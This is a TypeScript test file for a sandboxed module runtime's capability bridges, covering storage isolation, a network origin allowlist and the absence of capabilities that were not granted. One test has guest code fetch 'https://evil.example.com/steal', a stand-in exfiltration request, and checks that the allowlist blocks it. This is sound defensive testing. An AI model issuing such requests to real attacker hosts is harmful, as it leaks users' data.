import { describe, expect, it, vi } from "vitest";
import { LocalStorageHandler } from "../src/sandbox/capabilities/storageLocal";
import { NetworkHandler } from "../src/sandbox/capabilities/network";
import { ModuleRuntime } from "../src/sandbox/moduleRuntime";

const BASE_OPTIONS = {
  memoryLimitBytes: 4 * 1024 * 1024,
  maxStackSizeBytes: 1024 * 1024,
  computeBudgetMs: 500,
};

describe("capability bridge: storage:local", () => {
  it("get/set/delete work end to end through the guest-visible `storage` object", async () => {
    const runtime = await ModuleRuntime.create({
      ...BASE_OPTIONS,
      capabilities: [new LocalStorageHandler()],
    });

    const setOutcome = runtime.eval(`storage.set('coins', 42)`);
    expect(setOutcome.ok).toBe(true);

    const getOutcome = runtime.eval(`storage.get('coins')`);
    expect(getOutcome).toEqual({ ok: true, value: 42 });

    const missingOutcome = runtime.eval(`storage.get('nope')`);
    expect(missingOutcome).toEqual({ ok: true, value: null });

    const deleteOutcome = runtime.eval(`storage.delete('coins'); storage.get('coins')`);
    expect(deleteOutcome).toEqual({ ok: true, value: null });

    runtime.dispose();
  });

  it("keeps two module instances' storage completely isolated from each other", async () => {
    const moduleA = await ModuleRuntime.create({ ...BASE_OPTIONS, capabilities: [new LocalStorageHandler()] });
    const moduleB = await ModuleRuntime.create({ ...BASE_OPTIONS, capabilities: [new LocalStorageHandler()] });

    moduleA.eval(`storage.set('secret', 'module-a-value')`);
    const bResult = moduleB.eval(`storage.get('secret')`);

    moduleA.dispose();
    moduleB.dispose();

    expect(bResult).toEqual({ ok: true, value: null });
  });
});

describe("capability bridge: network", () => {
  it("allows a fetch to an allowlisted origin and returns the response to the guest", async () => {
    const fetchImpl = vi.fn(async () => new Response("hello from host", { status: 200 }));
    const runtime = await ModuleRuntime.create({
      ...BASE_OPTIONS,
      capabilities: [new NetworkHandler({ allowedOrigins: ["https://api.example.com"], fetchImpl })],
    });

    const evalResult = runtime.eval(`
      globalThis.__result = undefined;
      network.fetch('https://api.example.com/items').then(function(r) { globalThis.__result = r; });
      'started'
    `);
    expect(evalResult.ok).toBe(true);

    // The fetch is async — drain the microtask queue, then let QuickJS's
    // pending jobs run so the .then() callback actually executes.
    await new Promise((resolve) => setTimeout(resolve, 10));
    runtime.runPendingJobs();

    const readResult = runtime.eval(`JSON.stringify(globalThis.__result)`);
    runtime.dispose();

    expect(readResult.ok).toBe(true);
    if (readResult.ok) {
      const parsed = JSON.parse(readResult.value as string);
      expect(parsed).toEqual({ status: 200, ok: true, body: "hello from host" });
    }
    expect(fetchImpl).toHaveBeenCalledWith("https://api.example.com/items");
  });

  it("blocks a fetch to an origin outside the declared allowlist, before the fetch happens", async () => {
    const fetchImpl = vi.fn(async () => new Response("should never be reached"));
    const runtime = await ModuleRuntime.create({
      ...BASE_OPTIONS,
      capabilities: [new NetworkHandler({ allowedOrigins: ["https://api.example.com"], fetchImpl })],
    });

    runtime.eval(`
      globalThis.__error = undefined;
      network.fetch('https://evil.example.com/steal').catch(function(e) { globalThis.__error = String(e); });
      'started'
    `);

    await new Promise((resolve) => setTimeout(resolve, 10));
    runtime.runPendingJobs();

    const readResult = runtime.eval(`globalThis.__error`);
    runtime.dispose();

    expect(fetchImpl).not.toHaveBeenCalled();
    expect(readResult.ok).toBe(true);
    if (readResult.ok) {
      expect(String(readResult.value)).toMatch(/not in this module's declared allowlist/);
    }
  });
});

describe("capability bridge: absence as enforcement", () => {
  it("a capability the module was not granted simply does not exist on globalThis", async () => {
    const runtime = await ModuleRuntime.create({
      ...BASE_OPTIONS,
      capabilities: [new LocalStorageHandler()], // network intentionally not granted
    });

    const outcome = runtime.eval(`JSON.stringify({ hasStorage: typeof storage, hasNetwork: typeof network })`);
    runtime.dispose();

    expect(outcome.ok).toBe(true);
    if (outcome.ok) {
      const parsed = JSON.parse(outcome.value as string);
      expect(parsed.hasStorage).toBe("object");
      expect(parsed.hasNetwork).toBe("undefined");
    }
  });

  it("a module granted zero capabilities has no bridge globals at all", async () => {
    const runtime = await ModuleRuntime.create(BASE_OPTIONS); // no `capabilities` option
    const outcome = runtime.eval(
      `JSON.stringify({ hasStorage: typeof storage, hasNetwork: typeof network, hasHostCall: typeof __hostCall })`,
    );
    runtime.dispose();

    expect(outcome.ok).toBe(true);
    if (outcome.ok) {
      const parsed = JSON.parse(outcome.value as string);
      expect(parsed).toEqual({ hasStorage: "undefined", hasNetwork: "undefined", hasHostCall: "undefined" });
    }
  });

  it("calling a method not declared for a granted capability fails cleanly, not silently", async () => {
    const runtime = await ModuleRuntime.create({
      ...BASE_OPTIONS,
      capabilities: [new LocalStorageHandler()],
    });

    // `wipe` is not in LocalStorageHandler's syncMethods, so the shim never
    // defines storage.wipe — calling it is a normal guest-side TypeError.
    const outcome = runtime.eval(`
      try { storage.wipe(); 'no-error'; }
      catch (e) { 'threw: ' + e.name; }
    `);
    runtime.dispose();

    expect(outcome).toEqual({ ok: true, value: "threw: TypeError" });
  });

  it("a bridge function given malformed arguments fails cleanly instead of trusting the guest", async () => {
    const runtime = await ModuleRuntime.create({
      ...BASE_OPTIONS,
      capabilities: [new LocalStorageHandler()],
    });

    // storage.set validates its `key` argument host-side (storageLocal.ts)
    // rather than trusting whatever the guest sends — a number where a
    // string is expected must fail, not silently coerce or crash the host.
    const outcome = runtime.eval(`
      try { storage.set(12345, 'value'); 'no-error'; }
      catch (e) { 'threw: ' + e.message; }
    `);
    runtime.dispose();

    expect(outcome.ok).toBe(true);
    if (outcome.ok) {
      expect(outcome.value).toMatch(/key must be a string/);
    }
  });
});
